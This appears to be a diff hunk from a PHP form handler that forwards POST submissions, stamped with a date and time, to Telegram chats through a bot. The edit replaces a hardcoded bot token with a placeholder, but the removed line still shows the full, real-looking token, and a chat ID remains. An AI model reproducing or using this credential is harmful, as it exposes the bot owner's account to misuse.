@@ -15,7 +15,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $message .= "Date/Time (IST): " . $dateTime . "\n\n";
 
     // Telegram Bot details
-    $botToken = '7257814757:AAG5RyBq0M8KGqhuSS_PBK3tvnszTsI7OXg';
+    $botToken = '__TELEGRAM_BOT_TOKEN__';
     $chatIds = ['1272510733']; // List of chat IDs to send the message to
     
     $messageTitle = "StashPatrick ✅" ;
